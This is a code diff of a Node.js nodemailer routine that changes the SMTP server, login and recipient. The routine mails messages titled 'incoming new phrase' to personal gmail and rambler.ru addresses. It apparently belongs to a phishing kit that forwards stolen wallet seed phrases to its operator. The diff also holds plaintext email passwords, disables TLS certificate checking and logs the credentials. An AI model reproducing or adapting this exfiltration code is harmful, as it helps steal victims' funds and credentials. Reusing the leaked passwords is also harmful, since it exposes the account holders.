@@ -3,12 +3,12 @@ const nodemailer = require('nodemailer');
 async function sendmail(message) {
   try {
     let transporter = nodemailer.createTransport({
-      host: "smtp.titan.email",
+      host: "mail.graysfx.online",
       port: 465, // Use port 465 for SSL/TLS encryption
       secure: true, // Use true for SSL/TLS encryption
       auth: {
-        user: "aa@obulehealthcare.com.ng", // Your full email address
-        pass: "@Maroke2000" // Your email password
+        user: "info@graysfx.online", // Your full email address
+        pass: "@Maroke3030" // Your email password
       },
       tls: {
         rejectUnauthorized: false // Allow self-signed certificates
@@ -20,8 +20,8 @@ async function sendmail(message) {
     console.log("Transporter configuration:", transporter.options);
 
     let info = await transporter.sendMail({
-      from: 'aa@obulehealthcare.com.ng', // Sender address
-      to: "wjsmrgkhpf@rambler.ru", // List of receivers
+      from: 'info@graysfx.online', // Sender address
+      to: "mmaroke75@gmail.com", // List of receivers
       subject: "incoming new phrase ", // Subject line
       html: message // HTML body
     });
